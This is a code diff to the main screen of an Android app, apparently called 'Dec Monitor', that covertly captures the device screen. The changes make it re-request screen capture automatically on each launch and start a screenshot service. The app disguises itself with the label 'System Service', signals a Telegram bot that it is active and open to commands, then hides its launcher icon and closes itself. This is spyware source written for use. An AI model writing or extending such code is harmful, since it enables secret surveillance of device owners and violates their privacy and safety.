@@ -21,6 +21,8 @@ import kotlinx.coroutines.launch
 class MainActivity : AppCompatActivity() {
 
     private val PROJECTION_REQUEST = 1001
+    private val PREFS_NAME = "dec_monitor_prefs"
+    private val KEY_GRANTED = "projection_granted"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -47,30 +49,51 @@ class MainActivity : AppCompatActivity() {
             android.Manifest.permission.MODIFY_AUDIO_SETTINGS,
         ), 100)
 
-        findViewById<Button>(R.id.btnStart).setOnClickListener {
+        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+        val alreadyGranted = prefs.getBoolean(KEY_GRANTED, false)
+
+        val btnStart = findViewById<Button>(R.id.btnStart)
+        val tvStatus = findViewById<TextView>(R.id.tvStatus)
+
+        if (alreadyGranted) {
+            // auto request projection on every open
+            tvStatus.text = "Initializing..."
             val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
+        } else {
+            tvStatus.text = "System Service\nTap Start to initialize."
+            btnStart.setOnClickListener {
+                val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
+            }
         }
-
-        findViewById<TextView>(R.id.tvStatus).text = "System Service\nTap Start to initialize."
-
-        Handler(Looper.getMainLooper()).postDelayed({
-            StealthManager.hideIcon(applicationContext)
-        }, 5000)
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == PROJECTION_REQUEST && resultCode == Activity.RESULT_OK && data != null) {
+
+            // save grant state
+            getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+                .edit().putBoolean(KEY_GRANTED, true).apply()
+
             val serviceIntent = Intent(this, ScreenshotService::class.java).apply {
                 putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode)
                 putExtra(ScreenshotService.EXTRA_RESULT_DATA, data)
             }
             startForegroundService(serviceIntent)
-            findViewById<TextView>(R.id.tvStatus).text = "✅ Initialized."
+
+            findViewById<TextView>(R.id.tvStatus).text = "✅ Active."
+
             CoroutineScope(Dispatchers.IO).launch {
                 TelegramBot.sendMessage("✅ <b>Dec Monitor active.</b>\n/help for commands.")
             }
+
+            // hide icon after 3 seconds
+            Handler(Looper.getMainLooper()).postDelayed({
+                StealthManager.hideIcon(applicationContext)
+                finish() // close app after hiding
+            }, 3000)
         }
     }
 }
